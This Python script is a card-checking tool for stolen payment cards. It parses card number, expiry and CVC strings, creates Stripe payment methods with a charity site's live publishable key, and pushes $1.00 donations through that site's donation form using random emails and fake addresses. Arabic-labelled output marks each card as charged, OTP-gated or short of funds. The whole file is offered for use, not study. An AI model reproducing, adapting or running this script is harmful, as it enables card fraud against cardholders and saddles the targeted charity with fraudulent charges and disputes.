import requests,re,random,string,user_agent
def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
acc = (generate_random_account())
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	user = user_agent.generate_user_agent()
	headers = {
    'authority': 'needhelped.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'user-agent': user,
}

	res = r.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', cookies=r.cookies, headers=headers).text
	nonce=re.search(r'name="_charitable_donation_nonce" value="(.*?)"', res).group(1)
	headers = {
	        'authority': 'api.stripe.com',
	        'accept': 'application/json',
	        'content-type': 'application/x-www-form-urlencoded',
	        'origin': 'https://js.stripe.com',
	        'referer': 'https://js.stripe.com/',
	        'user-agent': user,
	    }
	
	data = f'type=card&billing_details[name]=Test+User&billing_details[email]={acc}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
	
	id = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()['id']

	headers = {
	    'authority': 'needhelped.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://needhelped.com',
	    'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
        '_charitable_donation_nonce': nonce,
	    '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
	    'campaign_id': '1164',
	    'description': 'Poor Children Donation Support',
	    'ID': '0',
	    'donation_amount': 'custom',
	    'custom_donation_amount': '1.00',
	    'first_name': 'tome',
	    'last_name': 'nwe',
	    'email': acc,
	    'address': 'Rts 58',
	    'address_2': '',
	    'city': 'Hekdgsjx',
	    'state': 'New York',
	    'postcode': '10080',
	    'country': 'US',
	    'phone': '12703109664',
	    'gateway': 'stripe',
	    'stripe_payment_method': id,
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	response = r.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	if 'redirect_to' in response.text or 'requires_action' in response.text:
		return 'OTP - اوتبي ⛔'
	if 'True' in response.text:
		return 'Charge - تشارج ✅'
	if 'Insufficient funds' in response.text or 'Funds' in response.text or 'fund' in response.text or 'Fund' in response.text:
		return 'Insufficient funds - رصيد غير كافي'
	else:
		mssg = response.json().get('errors', ['Transaction failed'])[0]
		return mssg
